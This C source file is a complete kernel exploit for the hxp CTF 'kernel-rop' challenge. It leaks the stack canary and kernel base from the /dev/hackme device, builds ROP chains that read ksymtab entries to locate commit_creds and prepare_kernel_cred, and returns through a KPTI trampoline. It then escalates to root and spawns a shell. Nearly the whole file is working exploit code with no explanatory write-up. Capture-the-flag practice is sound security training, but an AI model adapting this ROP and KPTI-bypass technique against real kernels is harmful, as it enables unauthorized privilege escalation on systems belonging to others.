/*************************************************************************************************
 * hxp ctf kernel-rop exploit 2: do commit_creds(prepare_kernel_cred(0)) to spawn a root shell
 * By Justin Gu
 *************************************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define DEV		"/dev/hackme"
#define PLEN	40

/* Global file descriptor */
int g_fd = 0;

/* cookie and address to build payload */
unsigned long canary, imagebase, ksymtab_commit_creds, commit_creds, ksymtab_prepare_kernel_cred, prepare_kernel_cred, root_cred, kpti_trampoline;

/* userspace registers to restore when recovering from kernel space */
unsigned long us_cs, us_rflags, us_rsp, us_ss;

//Gadgets

/* The following two gadgets are used to read arbitrary address */
unsigned long pop_rax_ret;	//pop rax; ret;
unsigned long read_rax_pop_rbp_ret; //mov eax, dword ptr[rax + 0x10]; pop rbp; ret; 

/* This gadget is used to pass parameters */
unsigned long pop_rdi_rbp_ret; //pop rdi; pop rbp; ret;

/* Temporarily used variable */
unsigned long tmp;

void save_userspace ()
{
	__asm__(
		".intel_syntax noprefix;"
		"mov us_cs, cs;"
		"mov us_rsp, rsp;"
		"mov us_ss, ss;"
		"pushf;"
		"pop us_rflags;"
		".att_syntax;"	
	);
}

void opendev ()
{
	g_fd = open (DEV, O_RDWR);
}

void leakinfo ()
{
	unsigned long payload[PLEN] = {0};
	ssize_t cnt = read (g_fd, payload, sizeof(payload));

	printf("[DEBUG] read %zd bytes\n", cnt);

	//show the information we leaked from kernel
	for (int i = 0; i < PLEN; i ++)
	{
		printf ("[%02d] 0x%lx\n", i, payload[i]);
	}

	canary = payload[16];
	imagebase = payload[38] & 0xFFFFFFFFFFFF0000;
	ksymtab_commit_creds = imagebase + 0xf87d90;
	ksymtab_prepare_kernel_cred = imagebase + 0xf8d4fc;
	kpti_trampoline = imagebase + 0x200f10 + 0x16;

	pop_rax_ret = imagebase + 0x4d11;
	read_rax_pop_rbp_ret = imagebase + 0x4aae;
	pop_rdi_rbp_ret = imagebase + 0x38a0;

	printf ("[DEBUG] \ncanary:0x%lx\nimagebase:0x%lx\nksysmtab_commit_creds:0x%lx\nksymtab_prepare_kernel_cred:0x%lx\nkpti_trampline:0x%lx\npop_rax_ret:0x%lx\nread_rax_pop_rbp_ret:0x%lx\npop_rdi_rbp_ret:0x%lx\n", canary, imagebase, ksymtab_commit_creds, ksymtab_prepare_kernel_cred, kpti_trampoline, pop_rax_ret, read_rax_pop_rbp_ret, pop_rdi_rbp_ret);
}

void spawn_root_shell ()
{
	if (getuid () == 0)
	{
		printf ("[DEBUG] Congratulations! we'll get a root shell\n");
		system ("/bin/sh");
	}
	else
	{
		printf ("[Error] failed to do privilege escalation.\n");
	}
}

void run_commit_creds ()
{
	unsigned long payload[PLEN] = {'\x00'};
	payload[16] = canary;
	payload[20] = pop_rdi_rbp_ret; //return address
	payload[21] = root_cred; // rdi = 0
	payload[22] = 0x0; // faked rbp
	payload[23] = commit_creds; // call commit_creds (root_cred)
	payload[24] = kpti_trampoline;
	payload[25] = 0;
	payload[26] = 0;
	payload[27] = (unsigned long)spawn_root_shell;
	payload[28] = us_cs;
	payload[29] = us_rflags;
	payload[30] = us_rsp;
	payload[31] = us_ss;

	printf ("[DEBUG] try to get address of prepare_kernel_cred()\n");
	write (g_fd, payload, sizeof (payload));
}

void get_cred()
{
	__asm__(
		".intel_syntax noprefix;"
		"mov root_cred, rax;"
		".att_syntax;"
	);

	printf("[DEBUG] root cred is : 0x%lx\n", root_cred);

	run_commit_creds ();
}

/* call commit_creds (prepare_kernel_cred (0)) to get root privilege. */
void run_prepare_kernel_cred ()
{
	unsigned long payload[PLEN] = {'\x00'};
	payload[16] = canary;
	payload[20] = pop_rdi_rbp_ret; //return address
	payload[21] = 0x0; // rdi = 0
	payload[22] = 0x0; // faked rbp
	payload[23] = prepare_kernel_cred; // call prepare_kernel_cred(0), return value is rax
	payload[24] = kpti_trampoline;
	payload[25] = 0;
	payload[26] = 0;
	payload[27] = (unsigned long)get_cred;
	payload[28] = us_cs;
	payload[29] = us_rflags;
	payload[30] = us_rsp;
	payload[31] = us_ss;

	printf ("[DEBUG] try to get address of prepare_kernel_cred()\n");
	write (g_fd, payload, sizeof (payload));
}

void _get_prepare_kernel_cred ()
{
	__asm__(
		".intel_syntax noprefix;"
		"mov tmp, rax;"
		".att_syntax;"
	);

	prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int) tmp;
	printf("[DEBUG] prepare_kernel_cred address is : 0x%lx\n, tmp is 0x%lx", prepare_kernel_cred, tmp);

	run_prepare_kernel_cred ();
}

void get_prepare_kernel_cred ()
{
	unsigned long payload[PLEN] = {'\x00'};
	payload[16] = canary;
	payload[20] = pop_rax_ret; //return address
	payload[21] = ksymtab_prepare_kernel_cred - 0x10;
	payload[22] = read_rax_pop_rbp_ret;
	payload[23] = 0; //faked rbp
	payload[24] = kpti_trampoline;
	payload[25] = 0;
	payload[26] = 0;
	payload[27] = (unsigned long)_get_prepare_kernel_cred; //IP, userspace function to get commit_creds() from eax
	payload[28] = us_cs;
	payload[29] = us_rflags;
	payload[30] = us_rsp;
	payload[31] = us_ss;

	printf ("[DEBUG] try to get address of prepare_kernel_cred()\n");
	write (g_fd, payload, sizeof (payload));
}

void _get_commit_creds ()
{
	__asm__(
		".intel_syntax noprefix;"
		"mov tmp, rax;"
		".att_syntax;"
	);

	commit_creds = ksymtab_commit_creds + (int) tmp;
	printf("[DEBUG] commit_creds() address is : 0x%lx, tmp is:%lx\n", commit_creds, tmp);

	get_prepare_kernel_cred ();
}

void get_commit_creds ()
{
	unsigned long payload[PLEN] = {'\x00'};
	payload[16] = canary;
	payload[20] = pop_rax_ret; //return address, pop rax; ret
	payload[21] = ksymtab_commit_creds - 0x10;	//rax = ksymtab_commit_creds - 0x10
	payload[22] = read_rax_pop_rbp_ret; // mov eax, dword ptr[rax + 0x10]; pop rbp; ret;
	payload[23] = 0; //faked rbp
	payload[24] = kpti_trampoline;
	payload[25] = 0;
	payload[26] = 0;
	payload[27] = (unsigned long)_get_commit_creds; //IP, userspace function to get commit_creds() from eax
	payload[28] = us_cs;
	payload[29] = us_rflags;
	payload[30] = us_rsp;
	payload[31] = us_ss;

	printf ("[DEBUG] try to get address of commit_creds()\n");
	write (g_fd, payload, sizeof (payload));
}

void attack ()
{
	get_commit_creds ();
}

int main ()
{
	save_userspace ();

	opendev ();
	if (g_fd <= 0)
	{
		printf ("[ERROR] failed to open device %s\n", DEV);

		return -1;
	}

	leakinfo ();
	
	attack ();
	close (g_fd);

	return 0;
}
